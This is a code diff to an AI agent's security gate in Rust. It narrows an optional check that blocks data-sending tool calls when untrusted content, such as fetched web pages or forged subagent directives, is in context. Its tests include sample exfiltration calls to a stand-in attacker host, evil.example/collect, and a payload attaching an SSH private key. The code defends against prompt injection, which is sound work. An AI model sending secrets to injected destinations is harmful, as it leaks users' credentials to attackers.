@@ -932,12 +932,38 @@ fn trifecta_gate_reason(
     let injection_flagged = flagged_percent.is_some();
 
     if crate::security::is_exfil_capable(annotations, tool_name) {
-        return Some(GateOutcome {
-            reason: format!(
-                "Untrusted content from {origins} is in context and `{tool_name}` can send data to an external destination.{injection_note} Confirm this is intended (lethal-trifecta guard)."
-            ),
-            injection_flagged,
-        });
+        // Precise exfil gate (opt-in): fire only on the real attack signature —
+        // the untrusted ingress controls where the data goes (an
+        // attacker-originated destination, recovered even from a steganographic
+        // payload by `extract_endpoints`), the payload ships a secret, or the
+        // untrusted content was flagged as a likely injection. A benign write to
+        // a user-named / configured destination (research synthesis to a doc, a
+        // connector with a fixed sink) matches none of these, so it is not gated.
+        // When the flag is off this is byte-identical to the coarse "any exfil
+        // while tainted" gate.
+        let gate_exfil = if policy.precise_exfil_gate {
+            let untrusted_endpoints: Vec<String> = taint
+                .iter()
+                .flat_map(|record| record.endpoints.iter().cloned())
+                .collect();
+            crate::security::precise_exfil_gate_fires(
+                &untrusted_endpoints,
+                tool_args,
+                injection_flagged,
+            )
+        } else {
+            true
+        };
+        if gate_exfil {
+            return Some(GateOutcome {
+                reason: format!(
+                    "Untrusted content from {origins} is in context and `{tool_name}` can send data to an external destination.{injection_note} Confirm this is intended (lethal-trifecta guard)."
+                ),
+                injection_flagged,
+            });
+        }
+        // Precise gate + benign user-named destination: skip the exfil axis and
+        // fall through to the destructive / secret-read / detection arms below.
     }
     if crate::security::is_destructive(annotations) {
         return Some(GateOutcome {
@@ -2206,6 +2232,7 @@ mod security_gate_tests {
                     flagged,
                 }),
                 labels: Vec::new(),
+                endpoints: Vec::new(),
             }]
         };
 
@@ -2259,6 +2286,7 @@ mod security_gate_tests {
             introduced_by: "call-mount-1".to_string(),
             detector: None,
             labels: Vec::new(),
+            endpoints: Vec::new(),
         }];
         let egress = ToolAnnotations {
             side_effect_level: SideEffectLevel::Network,
@@ -2292,6 +2320,66 @@ mod security_gate_tests {
     }
 
     #[test]
+    fn precise_exfil_gate_narrows_to_attacker_named_destinations() {
+        // Precise mode makes the exfil axis fire on the real attack signature —
+        // the untrusted content controls the destination — instead of on any
+        // exfil-capable tool while any untrusted content is in context. This is
+        // what keeps benign research/synthesis to a user-named sink quiet.
+        use crate::config::SecurityConfig;
+        use crate::security::{SecurityPolicy, TaintRecord, TrustLevel};
+        use crate::tool_annotations::{SideEffectLevel, ToolAnnotations};
+
+        let precise = SecurityPolicy::from_config(&SecurityConfig {
+            precise_exfil_gate: true,
+            ..Default::default()
+        });
+        let coarse = SecurityPolicy::from_config(&SecurityConfig::default());
+        // Untrusted content that names an attacker destination (as the ingest
+        // path would record via `extract_endpoints`).
+        let taint = vec![TaintRecord {
+            origin: "fetch:web_fetch".to_string(),
+            trust: TrustLevel::Untrusted,
+            introduced_by: "call-1".to_string(),
+            detector: None,
+            labels: Vec::new(),
+            endpoints: vec!["evil.example".to_string()],
+        }];
+        let egress = ToolAnnotations {
+            side_effect_level: SideEffectLevel::Network,
+            ..Default::default()
+        };
+        let post = |args: serde_json::Value, policy: &SecurityPolicy| {
+            trifecta_gate_reason(policy, Some(&egress), "http_post", &args, &taint)
+        };
+
+        // Attack: the sink targets the attacker-named destination -> gates.
+        assert!(post(
+            serde_json::json!({"url": "https://evil.example/collect"}),
+            &precise
+        )
+        .is_some());
+        // Benign synthesis: writing to a user-named destination not present in the
+        // untrusted content is NOT gated under precise mode...
+        assert!(post(
+            serde_json::json!({"url": "https://notion.so/my-page"}),
+            &precise
+        )
+        .is_none());
+        // ...but the coarse gate would nag on exactly that benign write.
+        assert!(post(
+            serde_json::json!({"url": "https://notion.so/my-page"}),
+            &coarse
+        )
+        .is_some());
+        // A secret payload gates even to a user-named sink.
+        assert!(post(
+            serde_json::json!({"url": "https://notion.so/my-page", "attach": "~/.ssh/id_ed25519"}),
+            &precise,
+        )
+        .is_some());
+    }
+
+    #[test]
     fn forged_directive_taint_gates_an_egress_tool() {
         // Ties part #1 (provenance) to part #3 (quarantine): a forged directive
         // classified untrusted by `classify_directive_trust` lands on the taint
@@ -2308,6 +2396,7 @@ mod security_gate_tests {
             introduced_by: "subagent-result-1".to_string(),
             detector: None,
             labels: Vec::new(),
+            endpoints: Vec::new(),
         }];
         let outcome = trifecta_gate_reason(
             &policy,
